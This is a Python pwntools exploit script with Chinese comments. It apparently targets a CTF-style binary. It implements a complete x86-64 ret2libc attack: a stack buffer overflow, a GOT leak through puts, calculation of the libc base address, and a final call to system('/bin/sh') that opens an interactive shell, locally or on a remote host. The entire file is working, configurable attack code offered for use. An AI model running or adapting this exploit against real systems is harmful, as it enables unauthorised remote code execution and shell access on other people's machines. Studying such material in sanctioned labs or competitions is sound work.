## `exploit.py`

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# x86-64 ret2libc: 泄露 -> system("/bin/sh"), 含 16 字节栈对齐处理
#
#   python3 exploit.py                                  # 本地
#   python3 exploit.py REMOTE HOST=10.0.0.5 PORT=9999
#   python3 exploit.py OFFSET=0x48 PROMPT='> ' ALIGN=1
#   python3 exploit.py GDB
#   python3 exploit.py LEAKN=2                          # GOT 还没被解析时用
#
# 依赖 pwntools >= 4.9, 同版本 libc.so.6

from pwn import *
import os, sys

# ────────────────────────────── CONFIG ──────────────────────────────
def _v(k, d): return args.get(k, os.environ.get(k, d))
def _n(v):    return int(v, 0)

BIN     = _v('BIN',    './SAMPLE')
LIBCF   = _v('LIBC',   './libc.so.6')
OFFSET  = _n(_v('OFFSET', '0x48'))   # buf -> saved RIP, 字节数
LEAK_FN = _v('LEAK',   'puts')       # 被泄露的 GOT 项
LEAKN   = _n(_v('LEAKN',  '1'))      # 链上连续 puts 几次; 2 = 用第二次拿真实 libc
PROMPT  = _v('PROMPT', '')           # 泄露前的提示串, 如 '> ' / 'name:'
MODE    = _v('MODE',   'twostage')   # twostage: 返回 main 复用连接 | oneshot: 重连
ALIGN   = _v('ALIGN',  'auto')       # auto | 1(插入 ret) | 0(不插)
ONEG    = _n(_v('ONEG', '0'))        # one_gadget 偏移, 0 = 关闭
HOST    = _v('HOST',   '127.0.0.1')
PORT    = _n(_v('PORT', '1337'))
# ────────────────────────────────────────────────────────────────────

PROMPT = PROMPT.encode() if PROMPT else None

context.arch      = 'amd64'
context.log_level = _v('LOG', 'info')
context.terminal  = ['tmux', 'splitw', '-h']

elf  = context.binary = ELF(BIN, checksec=False)
libc = ELF(LIBCF, checksec=False)


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='set pagination off\ncontinue\n')
    return process(elf.path)


def gadget(e, insns):
    """字节搜索优先, ROPgadget 兜底。返回值已按 e.address 重定位。"""
    try:
        return next(e.search(asm('; '.join(insns)), executable=True))
    except StopIteration:
        pass
    try:
        r = ROP(e, checksec=False)
        g = r.find_gadget(insns)
        if g:
            return g[0] if isinstance(g, (list, tuple)) else g.address
    except Exception:
        pass
    return None


def pdx(e):
    """返回 (pop rdi gadget, 需要补的哑字列表)。"""
    g = gadget(e, ['pop rdi', 'ret'])
    if g:
        return g, []
    g = gadget(e, ['pop rdi', 'pop rbp', 'ret'])
    if g:
        return g, [0]
    return None, []


RET            = gadget(elf, ['ret'])
POP_RDI, RDI_F = pdx(elf)
MAIN           = elf.symbols.get('main') or elf.entry


def build(chain, align):
    """align=1 时在 OFFSET 处插一个 ret, 把后续栈帧整体下移 8 字节。"""
    p = b'A' * OFFSET
    if align:
        p += p64(RET)
    return p + flat(chain, word_size=64)


def stage_leak(align):
    chain = []
    for _ in range(LEAKN):
        chain += [POP_RDI, *RDI_F, elf.got[LEAK_FN], elf.plt[LEAK_FN]]
    chain.append(MAIN)
    return build(chain, align)


def stage_sh(align):
    if ONEG:
        return build([libc.address + ONEG], align)
    rdi, f = (POP_RDI, RDI_F)
    if rdi is None:                      # 二进制里没有 pop rdi, 用 libc 的
        rdi, f = pdx(libc)
    return build([rdi, *f, next(libc.search(b'/bin/sh\x00')), libc.sym['system']], align)


def leak_phase(align):
    io = start()
    try:
        if PROMPT:
            io.recvuntil(PROMPT, timeout=8)
        io.sendline(stage_leak(align))
        for _ in range(LEAKN - 1):       # 前面的泄露行可能不是 libc 地址, 跳过
            if not io.recvuntil(b'\n', timeout=8):
                io.close(); return None, None
        raw = io.recvn(6, timeout=8)     # libc 指针恒为 6 字节, 不受 \x0a 影响
    except (EOFError, PwnlibException):
        io.close(); return None, None

    if len(raw) < 6:
        io.close(); return None, None
    v = u64(raw.ljust(8, b'\x00'))
    # 校验: libc 基址页对齐 => (leak - offset) & 0xfff == 0
    if (v - libc.sym[LEAK_FN]) & 0xfff:
        io.close(); return None, None
    return v, io


def main():
    if not RET:
        log.failure('找不到 ret gadget')
        return 1
    if not POP_RDI:
        log.failure('找不到 pop rdi; ret —— 该二进制需 ret2csu 或直接从 libc 取 gadget')
        return 1

    tries = [1, 0] if ALIGN == 'auto' else [1 if ALIGN in ('1', 1, True) else 0]

    leak = io = used = None
    for a in tries:
        leak, io = leak_phase(a)
        if leak:
            used = a
            break

    if not leak:
        log.failure('泄露失败: 依次检查 OFFSET / PROMPT / LEAK_FN 是否已被解析(试 LEAKN=2)')
        return 1

    libc.address = leak - libc.sym[LEAK_FN]
    log.success(f'align={used}  {LEAK_FN}@libc={leak:#x}  libc.base={libc.address:#x}')
    log.info(f'system={libc.sym["system"]:#x}')

    if MODE == 'oneshot':
        try: io.close()
        except Exception: pass
        io = start()
        if PROMPT: io.recvuntil(PROMPT, timeout=8)
    else:
        if PROMPT: io.recvuntil(PROMPT, timeout=8)

    io.sendline(stage_sh(used))
    io.interactive()


if __name__ == '__main__':
    sys.exit(main() or 0)
```

